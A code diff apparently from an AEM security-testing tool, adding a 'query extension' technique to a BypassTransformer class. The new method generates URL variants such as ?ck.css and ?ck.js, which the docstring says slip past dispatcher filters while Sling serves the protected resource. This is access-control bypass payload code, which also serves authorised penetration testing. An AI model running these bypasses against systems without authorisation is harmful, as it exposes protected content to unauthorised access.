@@ -59,6 +59,7 @@ class BypassTransformer:
             BypassTechnique.PATH_OVERLAP: self.path_overlap,
             BypassTechnique.SLING_SUFFIX: self.sling_suffix,
             BypassTechnique.JCR_CONTENT: self.jcr_content_bypass,
+            BypassTechnique.QUERY_EXTENSION: self.query_extension_bypass,
         }
     
     def transform(self, base_path: str, technique: Optional[BypassTechnique] = None) -> List[BypassResult]:
@@ -494,6 +495,32 @@ class BypassTransformer:
                     description=f"Path overlap + .json: {prefix} -> {base}",
                     priority=11
                 ))
+        
+        return results
+    
+    def query_extension_bypass(self, path: str) -> List[BypassResult]:
+        """Query parameter extension bypass.
+        
+        Appends a query parameter with a static-resource extension.
+        Dispatchers that inspect the query string for extension matching
+        see ?<random>.css and allow it through, while Sling ignores the
+        query parameter entirely and serves the original resource.
+        
+        Reference: 0ang3el / aem-hacker — uses ?<random>.css
+        """
+        results = []
+        base = path.rstrip("/")
+        
+        # Static resource extensions for the query param
+        extensions = [".css", ".js", ".png", ".gif", ".ico", ".html", ".bmp", ".svg"]
+        
+        for ext in extensions:
+            results.append(BypassResult(
+                url=f"{base}?ck{ext}",
+                technique=BypassTechnique.QUERY_EXTENSION,
+                description=f"Query param extension: ?ck{ext}",
+                priority=13
+            ))
         
         return results
     
